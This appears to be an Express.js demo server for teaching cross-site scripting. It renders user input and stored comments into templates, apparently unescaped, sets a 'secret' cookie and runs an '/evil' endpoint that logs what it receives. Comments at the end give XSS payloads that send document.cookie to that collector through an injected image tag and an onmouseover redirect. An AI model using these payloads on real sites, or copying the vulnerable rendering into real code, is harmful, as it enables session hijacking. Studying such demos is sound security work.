const express = require('express')
const bodyParser = require('body-parser')
const app = express()

const urlencodedParser = bodyParser.urlencoded({ extended: false })

app.set('view engine', 'ejs')

var comments = [
  {content: 'comment 1'},
  {content: 'comment 2'}
]

app.get('/', (req, res) => {
  res.cookie('secret-cookie','cfshfdoq93ohehkjhsd')
  res.render('./hello.ejs', { comments })
})

app.get('/first', urlencodedParser, (req, res) => {
  res.render('./first.ejs', {phrase: req.query.phrase})
})

app.get('/second', (req, res) => {
  res.render('./index.ejs', { comments })
})

app.post('/search', urlencodedParser, (req, res) => {
  comments.push(req.body)
  res.redirect('/second')
})

app.get('/evil', (req, res) => {
  console.log('evil got:', req.query)
  res.sendStatus(404)
})

app.listen(5000, '0.0.0.0', () => {
  console.log('Listening on port 5000')
})

// text <script>alert('hacked')</script>
// text <script>document.write('<img src="http://localhost:5000/evil?cookie='+escape(document.cookie)+'"/>')</script>
// Check out this <a href="http://www.youtube.com" onmouseover="window.location='http://localhost:5000/evil?cookie='+escape(document.cookie)">http://www.youtube.com</a>
